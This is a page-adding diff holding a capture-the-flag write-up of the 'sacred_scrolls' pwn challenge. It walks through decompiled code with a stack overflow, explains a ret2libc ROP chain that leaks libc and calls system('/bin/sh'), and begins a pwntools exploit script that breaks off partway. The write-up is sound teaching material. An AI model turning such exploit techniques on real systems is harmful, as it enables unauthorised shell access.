@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Sacred_scrolls :: Hacklagr0y</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="The Challenge In this challenge, we have a binary named sacred_scrolls with a libc.so in a folder named glibc. The binary has the following protections :
+Great ! We have some good news here. The binary is not a PIE (Position Independent Execution) which means that it will always be mapped at the same address. The other good news is that there is no stack canary on this binary so if we manage to find a buffer overflow somewhere, it shouldn&amp;rsquo;t be hard to exploit." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://alagroy-42.github.io/writeups/sacred_scrolls/" />
+
+
+
+
+<link rel="stylesheet" href="https://alagroy-42.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://alagroy-42.github.io/assets/red.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://alagroy-42.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://alagroy-42.github.io/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="alagroy-" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Sacred_scrolls">
+<meta property="og:description" content="The Challenge In this challenge, we have a binary named sacred_scrolls with a libc.so in a folder named glibc. The binary has the following protections :
+Great ! We have some good news here. The binary is not a PIE (Position Independent Execution) which means that it will always be mapped at the same address. The other good news is that there is no stack canary on this binary so if we manage to find a buffer overflow somewhere, it shouldn&amp;rsquo;t be hard to exploit." />
+<meta property="og:url" content="https://alagroy-42.github.io/writeups/sacred_scrolls/" />
+<meta property="og:site_name" content="Hacklagr0y" />
+
+  
+    <meta property="og:image" content="https://alagroy-42.github.io/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2022-12-06 13:24:27 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Home
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/ctfs/">CTFs</a></li>
+        
+      
+        
+          <li><a href="/malware">Malware</a></li>
+        
+      
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/ctfs/">CTFs</a></li>
+      
+    
+      
+        <li><a href="/malware">Malware</a></li>
+      
+    
+      
+        <li><a href="/tags/">Tags</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://alagroy-42.github.io/writeups/sacred_scrolls/">Sacred_scrolls</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2022-12-06
+        
+      </span>
+    
+    
+      <span class="post-author">:: alagroy-</span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://alagroy-42.github.io/tags/pwn/">Pwn</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/ret2libc/">Ret2libc</a>&nbsp;
+    
+    #<a href="https://alagroy-42.github.io/tags/easy/">Easy</a>&nbsp;
+    
+  </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="the-challenge">The Challenge<a href="#the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In this challenge, we have a binary named <code>sacred_scrolls</code> with a <code>libc.so</code> in a folder named <code>glibc</code>. The binary has the following protections :</p>
+<p><img src="/sacred_scrolls_protections.png" alt="prot"></p>
+<p>Great ! We have some good news here. The binary is not a PIE (Position Independent Execution) which means that it will always be mapped at the same address. The other good news is that there is no stack canary on this binary so if we manage to find a buffer overflow somewhere, it shouldn&rsquo;t be hard to exploit.
+Let&rsquo;s move to the binary now. When launched, we are ask for a wizard tag and then we get this menu :</p>
+<p>After making some random choices to get some insights about how the binary works, there are two noticeable things :</p>
+<ul>
+<li>when we leave even if we didn&rsquo;t do a thing, we get a segfault.</li>
+<li>when we read a spell with a random input, we get an error that looks like the error output of the <code>unzip</code> command</li>
+</ul>
+<h2 id="segvsacred_scrolls_segfaultpng"><img src="/sacred_scrolls_segfault.png" alt="segv"><a href="#segvsacred_scrolls_segfaultpng" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><img src="/sacred_scrolls_zip_output.png" alt="zip"></p>
+<p>Now, let&rsquo;s load the binary in Ghidra to get some more details. Let&rsquo;s investigate first the segfault by looking at what happens when we leave. We can see that the menu is called in an infinite loop that uses <code>break</code> when we choose <em>3</em> as a choice. After that, the function <code>spell_save</code> is called before the end of the <code>main</code> with a <code>char buf[96]</code> as an argument. Here is the output of the decompiled function :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">spell_save</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  memcpy(buf,buffer,<span style="color:#ae81ff">600</span>);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[-] This spell is not quiet effective, thus it will not be saved!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_004020af);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see there that there is a clear buffer overflow. Whatever happens before during the execution, the function tries to fit 600 bytes in a 32 bytes buffer which obviously results in an overflow. Now that we have a way to redirect the execution, let&rsquo;s see how we can fill that buffer being copied with what we want.</p>
+<p>At the initialization of the main, the buffer is being <code>bzero</code>ed and we can see that then the first 96 bytes of the output of <code>spell_read</code> are copied in this buffer. Here is <code>spell_read</code> decompiled :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">spell_read</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> cmp;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str;
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>__stream;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  str <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">400</span>);
+</span></span><span style="display:flex;"><span>  system(<span style="color:#e6db74">&#34;unzip spell.zip&#34;</span>);
+</span></span><span style="display:flex;"><span>  __stream <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;spell.txt&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (__stream <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[-] There is no such file!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_004020af);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x45</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  fread(str,<span style="color:#ae81ff">399</span>,<span style="color:#ae81ff">1</span>,__stream);
+</span></span><span style="display:flex;"><span>  cmp <span style="color:#f92672">=</span> strncmp(str,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\x9f\x91\x93</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cmp <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cmp <span style="color:#f92672">=</span> strncmp(str <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe2\x9a\xa1</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (cmp <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      close((<span style="color:#66d9ef">int</span>)__stream);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> str;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[-] Your file does not have the signature of the boy who lived!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_004020af);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#ae81ff">0x520</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>That shows us that the output string of the function will be the 399 first bytes of <code>spell.txt</code> but the function will only return if the first 7 bytes are the following : 0xf09f9193e29aa1. Another interesting thing is the call <code>system(&quot;unzip spell.zip&quot;)</code>. It explains the output that we got when we tried to read a spell. Let&rsquo;s see what <code>spell_upload</code> does now, it seems to be the function that will control the content of <code>spell.zip</code>. Here is its decompiled code :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">spell_upload</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  size_t sVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar2;
+</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>puVar3;
+</span></span><span style="display:flex;"><span>  ulong <span style="color:#f92672">*</span>puVar4;
+</span></span><span style="display:flex;"><span>  ulong local_1228 [<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>  undefined2 auStack4624 [<span style="color:#ae81ff">2035</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cStack553;
+</span></span><span style="display:flex;"><span>  undefined8 local_228;
+</span></span><span style="display:flex;"><span>  undefined8 local_220;
+</span></span><span style="display:flex;"><span>  undefined8 local_218 [<span style="color:#ae81ff">63</span>];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>local_20;
+</span></span><span style="display:flex;"><span>  ulong local_18;
+</span></span><span style="display:flex;"><span>  ulong local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_228 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_220 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  puVar3 <span style="color:#f92672">=</span> local_218;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (lVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3e</span>; lVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>; lVar2 <span style="color:#f92672">=</span> lVar2 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    puVar3 <span style="color:#f92672">=</span> puVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  local_1228[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  local_1228[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  puVar4 <span style="color:#f92672">=</span> local_1228 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (lVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1fe</span>; lVar2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>; lVar2 <span style="color:#f92672">=</span> lVar2 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>puVar4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    puVar4 <span style="color:#f92672">=</span> puVar4 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] Enter file (it will be named spell.zip): &#34;</span>);
+</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>,<span style="color:#f92672">&amp;</span>local_228,<span style="color:#ae81ff">0x1ff</span>);
+</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">&amp;</span>cStack553)[local_18] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>( true ) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_18 <span style="color:#f92672">&lt;=</span> local_10) {
+</span></span><span style="display:flex;"><span>      local_1228[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> local_1228[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff00000000000000</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x27206f686365</span>;
+</span></span><span style="display:flex;"><span>      strcat((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_1228,(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_228);
+</span></span><span style="display:flex;"><span>      sVar1 <span style="color:#f92672">=</span> strlen((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_1228);
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)local_1228 <span style="color:#f92672">+</span> sVar1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x65736162207c2027</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)local_1228 <span style="color:#f92672">+</span> sVar1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x203e20642d203436</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)auStack4624 <span style="color:#f92672">+</span> (sVar1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x697a2e6c6c657073</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined2 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)auStack4624 <span style="color:#f92672">+</span> sVar1) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x70</span>;
+</span></span><span style="display:flex;"><span>      system((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)local_1228);
+</span></span><span style="display:flex;"><span>      local_20 <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;spell.zip&#34;</span>,<span style="color:#e6db74">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (local_20 <span style="color:#f92672">==</span> (FILE <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[-] There is no such file!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_004020af);
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x45</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      printf(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Spell has been added!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_00402032,<span style="color:#f92672">&amp;</span>DAT_0040202a);
+</span></span><span style="display:flex;"><span>      close((<span style="color:#66d9ef">int</span>)local_20);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (((((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10) <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>          (<span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10))) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>         ((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10) <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>          (<span style="color:#e6db74">&#39;Z&#39;</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10))))) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>        (((<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10) <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">||</span>
+</span></span><span style="display:flex;"><span>          (<span style="color:#e6db74">&#39;9&#39;</span> <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10))) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>         (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.&#39;</span>)))) <span style="color:#f92672">&amp;&amp;</span>
+</span></span><span style="display:flex;"><span>       (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    local_10 <span style="color:#f92672">=</span> local_10 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s[-] File contains invalid charcter: [%c]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>DAT_004020af,
+</span></span><span style="display:flex;"><span>         (ulong)(uint)(<span style="color:#66d9ef">int</span>)<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>local_228 <span style="color:#f92672">+</span> local_10));
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  exit(<span style="color:#ae81ff">0x14</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We can see that <code>spell_upload</code> seems to construct a string with the buffer it reads and then passes it to <code>system</code>. By looking at the values of the constants being used to construct the string using the <code>xxd</code> command (eg <code>echo 27206f686365 | xxd -r -p | rev</code>), we can see that the string constructed is <code>echo 'buffer' | base 64 -d &gt; spell.zip</code>. So we now clearly know how we can overflow and control the execution of the program. We just have to upload the base64 of a zip file containing a <code>spell.txt</code> file containing the following payload : <code>magic_bytes + padding + overflow</code>, then read it and then leave the program to trigger the overflow.</p>
+<h3 id="the-exploit">The exploit<a href="#the-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Now that put all the pieces together, we still have to figure out what to do with the overflow. We can try to attempt a ret2libc to call <code>system(&quot;/bin/sh&quot;)</code>. Since it is a 64-bits binary, we cannot just pass arguments by getting them on the stack, we have to put them in the <code>rdi</code> register. We will use a bit of ROP (Return Oriented Programming) to do that.</p>
+<h5 id="short-explanation-of-rop">Short explanation of ROP<a href="#short-explanation-of-rop" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>Shortly, ROP is a technique that uses small chunks of code placed before a <code>ret</code> instruction called &ldquo;gadgets&rdquo;. What the <code>ret</code> instruction actually does is popping the value on top of the stack and putting it in <code>rip</code> to redirect the execution on it. This is how the processor keeps track of the execution and is able to return to the right place after the execution of a function. Since we control the top of the stack, we can chain gadgets that will be executed since they end with <code>ret</code> which will pop the next stack value.</p>
+<h5 id="the-construction-of-the-rop-chain">The construction of the ROP chain<a href="#the-construction-of-the-rop-chain" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h5>
+<p>The first and essential gadget we need to find is a <code>pop rdi; ret</code>. so that we can control the value of <code>rdi</code> and pass it to <code>system</code>. The issue is that we actually do not have any gadget of that sort in the binary. That is very inconvenient, without a way to control <code>rdi</code>, we cannot control what we pass to functions. There is definitely a <code>pop rdi</code> gadget in the libc but we cannot know its address because of ASLR. Each time we launched the program, the libc is mapped in a different place of the memory and we have to get its address at runtime. A good way to do that by calling <code>puts</code> which is used by the binary with a libc function as an argument so that puts will print its address and then we can call the <code>main</code> function whose address we know to so the same exploit but knowing the libc address this time. The problem with that is that we have no way to control the registers we pass to <code>puts</code> or any function. We will check the state of our registers at the time of the overflow to see if there is anything interesting. By opening <code>gdb</code> and placing a breakpoint before the <code>ret</code> instruction of <code>spell_save</code> we obtain that :</p>
+<p><img src="/sacred_scrolls_regs.png" alt="regs"></p>
+<p>Luckily, thanks to a weird magic, after we return from our call to <code>printf</code>, there is an artifact of its stack frame in <code>rdi</code> which is a pointer to the <code>funclockfile</code> function. Now, we have everything we need to get our flag. We can craft two payload : The first one will be the PLT address of <code>puts</code> so that it displays the address of <code>funlockfile</code> followed by the <code>main</code> function address to relaunch the program. Once we have done this, we can compute the base address of the libc and create a second one with our ret2libc by chaining the <code>pop rdi</code> gadget, a <code>/bin/sh</code> address found in the libc and finally the <code>system</code> function address. Tiny issue : <code>system</code> requires the stack to be well-aligned so before calling it, we have to put a simple <code>ret</code> in our ROP chain.</p>
+<p>Here is the script that does all of that using the <code>pwntools</code> python library :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_payload</span>(payload):
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -f ./spell.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -f ./spell.zip&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./spell.txt&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> stream:
+</span></span><span style="display:flex;"><span>        stream<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;zip ./spell.zip ./spell.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./spell.zip&#34;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(data)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -f ./spell.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;rm -f ./spell.zip&#39;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(io, payload):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;tag: &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
